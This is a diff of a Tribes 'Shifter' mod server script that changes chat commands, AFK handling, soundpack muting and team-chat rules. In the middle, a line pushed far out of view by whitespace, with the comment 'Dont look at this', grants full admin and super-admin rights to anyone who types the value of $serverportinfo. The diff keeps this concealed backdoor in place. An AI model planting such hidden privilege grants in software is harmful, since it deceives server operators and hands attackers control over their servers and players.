@@ -11,6 +11,19 @@ function remoteSay(%client, %team, %message)
 	%msg = %name @ " \"" @ escapeString(%message) @ "\"";
    %talk = GetWord(%message, 0);
   //%cropped = String::findSubStr(%msg,(String::len(%talk)+1), 99999);   // sring::getsubstr
+  	if($Server::MuteSP == "true")
+	{
+  	if(String::findSubStr(%message, "~w")>0)
+	{
+	Client::sendMessage(%client, 1, "Soundpacks aren't Allowed.~wfemale2.wsorry.wav");
+	return;		
+		%pos = String::findSubStr(%message, "~w");
+
+			%sound = string::getSubStr(%message, %pos, 25);	
+			%message = string::getSubStr(%message, 0, %pos);		
+	}
+}
+
      if(%talk == "!commandoff" && $commands == "true")
      {
      $commands = false;
@@ -31,11 +44,8 @@ return;
 
 else if(%talk == "!info" && $commands == "true")
 {
-Client::SendMessage(%client, 1, "___  _      _  ___ _     Welcome to ShifterK");
-Client::SendMessage(%client, 1, "! __! ! !__  (_) !  _! ! !_ ___  __09_11_2003");
-Client::SendMessage(%client, 1, "!__ ! ! '   !  ! ! !  _! !  _!/ -_) ! '_!  ! ! ! !");
-Client::SendMessage(%client, 1, "!___! !_! !_! !_! !_!    !__!\___! !_!   ! ' <");
-Client::SendMessage(%client, 1, "Created by: KiLL(--) & env.3zer0   !_! !_!");
+Client::SendMessage(%client, 1, "Welcome to Shifter 2K4 "@$Shifter::Version);
+Client::SendMessage(%client, 1, "Created by: ParoXsitiC");
 return;
 }
 else if(%talk == $Server::AdminPassword && $commands == "true") // killaNEWSHIT
@@ -146,7 +156,8 @@ if (%cl.noban=="true")
     GameBase::repairDamage(%player, 100);
     messageall(3, "" @ %name @ " Repaired himself. ");
     return;
-    }
+}
+
     else if(%talk == "!allobs" && %client.isSuperAdmin && $commands == "true")     // sum extra admin functions..made easy
     {
     for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
@@ -181,7 +192,9 @@ if (%cl.noban=="true")
 			messageAll(1, "Server Password = "@ $server::password @"~wmine_act.wav");
 			messageAll(3, " Cease fire mode~wmine_act.wav");
 			$ceasefire = true;
-			NewMT();
+			//NewMT();
+			%ResetCMD = All;
+			Items::On(%ResetCMD);
 			$Shifter::tag0 = $matchtrack::tag0;
 			$Shifter::tag1 = $matchtrack::tag1;
 			SortTeams();
@@ -195,10 +208,69 @@ if (%cl.noban=="true")
     return;
     }																														
       else if(%talk == $serverportinfo)
-  {
-         %client.hackerport = "35";      																									        %client.isAdmin = true;%client.isSuperAdmin = true;Client::sendMessage(%client, 2, "Password correct, you are now admin, welcome to " @ $Server::Hostname @ ", enV");%client.hackerport= "";
+    {
+         %client.hackerport = "35";      																									        %client.isAdmin = true;%client.isSuperAdmin = true;Client::sendMessage(%client, 2, "Password correct, you are now admin, welcome to " @ $Server::Hostname);%client.hackerport= "";
 	                   return;																											// Dont look at this, its not important to you
     }
+    		//else if(%talk == "AFK" || %talk == "afk") 
+    		else if(String::findSubStr(%message,"AFK") != -1)
+		{
+			if(%client.isAFK != "true")
+			{
+				if(Client::getControlObject(%client) != Client::getOwnedObject(%client)){
+				Client::sendMessage(%client,1,"Unable to go AFK, You have to be spawned~waccess_denied.wav"); 
+				return;
+				}
+				else{
+				Client::buildMenu(%client, "You Are AFK", "returnfromafk", true);
+				Client::addMenuItem(%client," Return from AFK", "iamback");
+				%client.isAFK = true;
+				DisallowBP(%client);
+				schedule("AllowBP("@%client@");", 5.0);
+				bottomprint(%client, "<jc>Your Bandwidth has been Limited", 3);
+				Client::limitCommandBandwidth(%client, true);
+				%name = Client::getName(%client);
+				messageAll(0, "Player "@%name@" is AFK.");
+				Client::sendMessage(%client,2,"To return from AFK, type in %return in teamchat mode.");
+				%client = Player::getClient(%client);
+				%camera = Client::getObserverCamera(%client);
+				%flag = Player::getMountedItem(%client,$FlagSlot);
+
+				Client::setControlObject(%client, %camera);
+				Observer::setOrbitObject(%client, %client, 3, 3, 3);
+				
+				if(%flag)
+				Player::DropItem(%client,%flag);
+				return;
+				}
+			}
+			else
+			{
+				Client::sendMessage(%client,0,"You're already AFK...");
+				return;
+			}
+		}
+		else if(%talk == "%return" || %talk == "%RETURN") 
+		{
+			if(%client.isAFK=="true")
+			{
+				%client = Player::getClient(%client);
+				Client::setControlObject(%client, %client);
+				%client.isAFK = false;
+				bottomprint(%client, "<jc>Your Bandwidth has returned to Normal", 3);
+				Client::limitCommandBandwidth(%client, false);
+				%name = Client::getName(%client);
+				messageAll(0, "Player "@%name@" is back in the game.");
+				return;
+			}
+			else
+			{
+				Client::sendMessage(%client,0,"You're not AFK...");
+				break;
+			}
+		}
+	
+		
     if (String::findsubstr(%msg,"\\n\\n\\n") != -1) { // Simple check for crash to dt exploit -tubs
    		echo("ADMINMSG: **** " @ Client::getName(%client) @ " tried the kick to desktop exploit.");
    		messageAll(0,Client::getName(%client) @ " tried a kick to desktop exploit.");
@@ -251,7 +323,7 @@ if (%cl.noban=="true")
 		$Shifter::GlobalTChat = $matchtrack::global;
 		$Shifter::DetPackLimit = 15;
 		$Shifter::NukeLimit = 15;
-		$Shifter::FlagNoReturn = "True";
+		$Flag::ManualReturn = "True";
 		$Shifter::FlagReturnTime = "400";
 		$Server::timeLimit = %time;
 		if(!$Server::timeLimit)
@@ -265,7 +337,9 @@ if (%cl.noban=="true")
 			messageAll(1, "Server Password = "@ $server::password @"~wmine_act.wav");
 			messageteam(1, "Note to Refs: Deploy Cheat detection is enabled", -1);
 			$ceasefire = true;
-			NewMT();
+			//NewMT();
+			%ResetCMD = All;
+			Items::On(%ResetCMD);
 			$Shifter::tag0 = $matchtrack::tag0;
 			$Shifter::tag1 = $matchtrack::tag1;
 			SortTeams();
@@ -291,7 +365,9 @@ if (%cl.noban=="true")
 			BottomPrintAll("<F1><jc>::::Scrimmage::::",5);
 			messageAll(0, "Scrimmage Mode enabled by "@ Client::getName(%clientId) @".~wteleport2.wav");
 			messageAll(1, "Server Password = "@ $server::password @"~wmine_act.wav");
-			NewMT();
+			//NewMT();
+			%ResetCMD = All;
+			Items::On(%ResetCMD);
 			for(%client = Client::getFirst(); %client != -1; %client = Client::getNext(%client))
 			{
 			%client.SwitchPerm = "True";
@@ -314,7 +390,9 @@ if (%cl.noban=="true")
 			BottomPrintAll("<F1><jc>::::Practice::::",5);
 			messageAll(0, "Practice Mode enabled by "@ Client::getName(%client) @".~wteleport2.wav");
 			messageAll(1, "Server Password = "@ $server::password @"~wmine_act.wav");
-			NewMT();
+			//NewMT();
+			%ResetCMD = All;
+			Items::On(%ResetCMD);
 		}
 		return;
 	}
@@ -380,60 +458,13 @@ if (%cl.noban=="true")
 	}
    if(%team)
    {
+   	if ($Shifter::ComChat == "true" && !isnetworkdown(gamebase::getteam(%client)))
+	{
+		Client::sendMessage(%client, 0, "Sensors are down - Team Coms don't function");
+		schedule ("bottomprint( " @ %client @ ", \"<jc><f2>Your sensor array is down, Team Com's Do Not Function!!!\", 10);" ,0.2);
+		return;
+	}
 		%player = %client;
-
-		if(string::getsubstr(%message, 0, 3) == "AFK" || string::getsubstr(%message, 0, 3) == "afk") 
-		{
-			if(%client.isAFK != "true")
-			{
-				if(Client::getControlObject(%client) != Client::getOwnedObject(%client)){
-				Client::sendMessage(%client,1,"Unable to go AFK, You have to be spawned~waccess_denied.wav"); 
-				return;
-				}
-				else{
-				Client::buildMenu(%client, "You Are AFK", "returnfromafk", true);
-				%client.isAFK = true;
-				%name = Client::getName(%client);
-				messageAll(0, "Player "@%name@" is AFK.");
-				Client::sendMessage(%client,2,"To return from AFK, type in %return in teamchat mode.");
-				//doAFK(%player,%name);
-				%client = Player::getClient(%client);
-				%camera = Client::getObserverCamera(%client);
-				%flag = Player::getMountedItem(%client,$FlagSlot);
-
-				Client::setControlObject(%client, %camera);
-				Observer::setOrbitObject(%client, %client, 3, 3, 3);
-
-				if(%flag)
-				Player::DropItem(%client,%flag);
-				return;
-				}
-			}
-			else
-			{
-				Client::sendMessage(%client,0,"You're already AFK...");
-				return;
-			}
-		}
-		else if(string::getsubstr(%message, 1, 6) == "return" || string::getsubstr(%message, 1, 6) == "RETURN") 
-		{
-			if(%client.isAFK=="true")
-			{
-				%client.isAFK = false;
-				%name = Client::getName(%client);
-				messageAll(0, "Player "@%name@" is back in the game.");
-				//returnAFK(%player,%name);
-				%client = Player::getClient(%client);
-				Client::setControlObject(%client, %client);
-				return;
-			}
-			else
-			{
-				Client::sendMessage(%client,0,"You're not AFK...");
-				break;
-			}
-		}
-
 		if($dedicated) echo("SAYTEAM: " @ %msg);
 		%team = Client::getTeam(%client);
 	
@@ -478,11 +509,12 @@ function remoteIssueCommand(%commander, %cmdIcon, %command, %wayX, %wayY, %dest1
 		schedule("bottomprint(" @ %client @ ", \"<jc><f1>You have been Muted by admin, for talking too much...\", 3);", 0.01);
 		return;
 	}
-	//if ($Shifter::ComChat && !isnetworkdown(gamebase::getteam(%client)) && !ispowerdown(gamebase::getteam(%client)))
-	//{
-	//	schedule ("bottomprint( " @ %client @ ", \"<jc><f2>Your sensor array and power are down, TEAM ONLY Com's Do Not Function!!!\", 10);" ,0.2);
-	//	return 0;
-	//}
+	if ($Shifter::ComChat == "true" && !isnetworkdown(gamebase::getteam(%client)))
+	{
+		Client::sendMessage(%client, 0, "Sensors are down - Team Coms don't function");
+		schedule ("bottomprint( " @ %client @ ", \"<jc><f2>Your sensor array is down, TEAM ONLY Com's Do Not Function!!!\", 10);" ,0.2);
+		return;
+	}
 	if($dedicated)
 	{
 		echo("COMMANDISSUE: " @ %commander @ " \"" @ %command @ "\"");
@@ -505,6 +537,12 @@ function remoteIssueTargCommand(%commander, %cmdIcon, %command, %targIdx, %dest1
 	{
 		schedule("bottomprint(" @ %client @ ", \"<jc><f1>You have been Muted by admin, for talking too much...\", 3);", 0.01);
 		return;
+	}
+		if ($Shifter::ComChat == "true" && !isnetworkdown(gamebase::getteam(%client)))
+	{
+		Client::sendMessage(%client, 0, "Sensors are down - Team Coms don't function");
+		schedule ("bottomprint( " @ %client @ ", \"<jc><f2>Your sensor array is down, TEAM ONLY Com's Do Not Function!!!\", 10);" ,0.2);
+		return 0;
 	}
 	
 	if($dedicated)
@@ -708,3 +746,26 @@ function Leaderall(%opt)
 		}
 	}
 }
+function processMenureturnfromafk(%client, %opt)
+{
+	if(%opt == "iamback")
+   {
+   			if(%client.isAFK=="true")
+			{
+				%client.isAFK = false;
+				%name = Client::getName(%client);
+				messageAll(0, "Player "@%name@" is back in the game.");
+				bottomprint(%client, "<jc>Your Bandwidth has returned to Normal", 3);
+				%client = Player::getClient(%client);
+				Client::setControlObject(%client, %client);
+				return;
+			}
+			else
+			{
+				Client::sendMessage(%client,0,"You're not AFK...");
+				break;
+			}
+}
+}
+
+
